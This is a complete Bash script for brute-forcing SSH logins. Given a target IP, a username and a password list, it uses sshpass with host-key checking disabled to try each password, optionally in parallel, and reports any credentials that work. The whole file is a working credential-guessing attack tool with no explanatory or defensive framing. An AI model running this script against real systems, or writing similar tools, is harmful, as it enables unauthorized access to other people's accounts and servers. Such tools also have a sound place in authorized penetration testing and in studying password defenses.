#! /bin/bash

#Default values
DEFAULT_PASSWORD_LIST="sample_password_list.txt"
NUM_THREADS=1
PASSWORD_LIST=""
OUTPUT_FILE=""
VERBOSE=0

usage(){
    echo "Usage: $0 <target_ip> -u <username> [ -p <password_list>] [-t <num_threads] [-o <output_file>] [-v <verbose_output>]"
    echo "Options:"
    echo "  -u    Username for SSH Login (mandatory)"
    echo "  -p    Path of Password List  (optional, default = $DEFAULT_PASSWORD_LIST)"
    echo "  -t    Number of threads      (optional, default = 1)"
    echo "  -o    Output File            (optional)"
    echo "  -v    Verbose Output         (optional)"
    exit 1
} 

verbose(){
    if [ "$VERBOSE" -eq 1 ]; then
        echo "$1";
    fi
}

check_dependencies(){
    verbose "[*] Checking for root privileges"
    if [ "$(id -u)" -ne 0 ]; then
        echo "[-] Need root privileges"
        exit 1
    fi

    verbose "[*] Checking if sshpass is installed"
    if ! command -v sshpass &>/dev/null; then
        echo "[*] sshpass not found. Installing dependencies..."
        chmod +x requirements.sh
        ./requirements.sh
    fi
}

attemp_login() {
    local PASSWORD="$1"

    #Attempt SSH login in Non-Interactive way
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 "$USERNAME@$TARGET_IP" exit &>/dev/null
    
    if [ "$?" -eq 0 ]; then
        echo "[+] Success: Username: $USERNAME, Password: $PASSWORD"
        exit 0
    else  
        echo "[-] Failed: $PASSWORD"
    fi
}

if [ "$#" -lt 2 ]; then
    usage
fi

TARGET_IP=$1
shift

while getopts ":u:p:t:o:v" opt; do
    case $opt in 
        u) USERNAME="$OPTARG" ;;
        p) PASSWORD_LIST="$OPTARG" ;;
        t) NUM_THREADS="$OPTARG" ;;
        o) OUTPUT_FILE="$OPTARG" ;;
        v) VERBOSE=1 ;;
        *) usage ;;
    esac
done

if [ -z "$TARGET_IP" ] || [ -z "$USERNAME" ]; then
    echo "[!] Error: Target IP & Username are mandatory."
    usage
fi

if [ -z "$PASSWORD_LIST" ]; then
    if [ ! -f "$DEFAULT_PASSWORD_LIST" ]; then
        echo "[-] Error: Default Password list ($DEFAULT_PASSWORD_LIST) not exist"
        exit 1
    fi
    PASSWORD_LIST="$DEFAULT_PASSWORD_LIST"
fi

if [ ! -f "$PASSWORD_LIST" ]; then
    echo "[-] Error: Password List: ($PASSWORD_LIST) not exist"
    exit 1
fi

check_dependencies

if [ -n "$OUTPUT_FILE" ]; then
    exec &> "$OUTPUT_FILE"
fi


#Start Brute Force
verbose "[*] Starting brute force attack..."
verbose "[*] Target = $TARGET_IP"
verbose "[*] Username = $USERNAME"
verbose "[*] password_list = $PASSWORD_LIST"
verbose "[*] Threads = $NUM_THREADS"

ACTIVE_THREADS=0

while read -r PASSWORD; do 

    attemp_login "$PASSWORD" &
    ACTIVE_THREADS=$((ACTIVE_THREADS + 1))

    if [ "$ACTIVE_THREADS" -ge "$NUM_THREADS" ]; then
        #wait 1 thread to finish
        wait -n
        ACTIVE_THREADS=$((ACTIVE_THREADS - 1))
    fi

done < "$PASSWORD_LIST"